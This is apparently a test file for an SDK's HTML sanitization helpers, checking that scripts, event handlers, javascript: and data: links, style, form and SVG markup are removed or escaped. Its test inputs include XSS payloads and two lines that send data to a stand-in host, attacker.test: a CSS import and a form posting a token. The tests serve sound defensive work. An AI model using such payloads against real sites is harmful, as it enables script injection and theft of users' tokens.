import { describe, expect, it, vi } from "vitest";

import {
  escapeHtml,
  sanitizeHtml,
  sanitizeHtmlToResult,
} from "@flow-builder/components/sdk/sanitization";

describe("SDK sanitization helpers", () => {
  it("escapes HTML text into inert entities", () => {
    expect(escapeHtml(`<script>alert("x")</script> & 'quote'`)).toBe(
      "&lt;script&gt;alert(&quot;x&quot;)&lt;/script&gt; &amp; &#39;quote&#39;",
    );
  });

  it("falls back to escaped inert output without a browser window", () => {
    const result = sanitizeHtmlToResult(`<img src=x onerror="alert(1)"><script>boom()</script>`, {
      window: null,
    });

    expect(result.html).toBe(
      "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;script&gt;boom()&lt;/script&gt;",
    );
    expect(result.usedFallback).toBe(true);
    expect(result.error).toBeNull();
  });

  it("reports unchanged plain text in no-browser fallback without claiming sanitization", () => {
    const result = sanitizeHtmlToResult("plain text", { window: null });

    expect(result).toEqual({
      error: null,
      html: "plain text",
      usedFallback: true,
      wasSanitized: false,
    });
  });

  it("removes scripts, event handlers, and dangerous href protocols", () => {
    const sanitized = sanitizeHtml(
      `<p onclick="alert(1)">Hi <a href="javascript:alert(1)">js</a><a href="data:text/html,<b>x</b>">data</a><a href="https://example.test/path">safe</a><script>alert(1)</script></p>`,
    );

    expect(sanitized).toContain("<p>Hi");
    expect(sanitized).toContain(`<a href="https://example.test/path">safe</a>`);
    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("onclick");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("data:text/html");
  });

  it("removes style and form elements from sanitized fragments", () => {
    const sanitized = sanitizeHtml(
      `<style>@import url("https://attacker.test/leak.css")</style><form action="https://attacker.test/steal"><input name="token"><button>Submit</button></form><p>safe</p>`,
    );

    expect(sanitized).toContain("<p>safe</p>");
    expect(sanitized).not.toMatch(/<style/i);
    expect(sanitized).not.toContain("@import");
    expect(sanitized).not.toMatch(/<form/i);
    expect(sanitized).not.toContain("action=");
  });

  it("reports clean browser-sanitized HTML without fallback or modification", () => {
    const result = sanitizeHtmlToResult("<p>hello</p>");

    expect(result).toEqual({
      error: null,
      html: "<p>hello</p>",
      usedFallback: false,
      wasSanitized: false,
    });
  });

  it("removes SVG, math, and foreignObject-like markup", () => {
    const sanitized = sanitizeHtml(
      `<svg><foreignObject><p onclick="alert(1)">unsafe</p></foreignObject><circle onload="boom()" /></svg><math><mtext>math</mtext></math><p>safe</p>`,
    );

    expect(sanitized).toContain("<p>safe</p>");
    expect(sanitized).not.toMatch(/<svg/i);
    expect(sanitized).not.toMatch(/foreignobject/i);
    expect(sanitized).not.toMatch(/<math/i);
    expect(sanitized).not.toContain("onclick");
    expect(sanitized).not.toContain("onload");
  });

  it("sanitizes malformed HTML without leaking executable markup", () => {
    const sanitized = sanitizeHtml(
      `<div><a href="javascript:alert(1)"><span>broken<script>x()</div>`,
    );

    expect(sanitized).toContain("broken");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("<script");
  });

  it("fails closed by escaping input if the sanitizer throws", () => {
    const sanitizer = vi.fn(() => {
      throw new Error("purifier unavailable");
    });
    const result = sanitizeHtmlToResult(`<a href="javascript:alert(1)">run</a>`, { sanitizer });

    expect(result.html).toBe("&lt;a href=&quot;javascript:alert(1)&quot;&gt;run&lt;/a&gt;");
    expect(result.usedFallback).toBe(true);
    expect(result.wasSanitized).toBe(true);
    expect(result.error).toBe("HTML sanitizer failed.");
  });
});
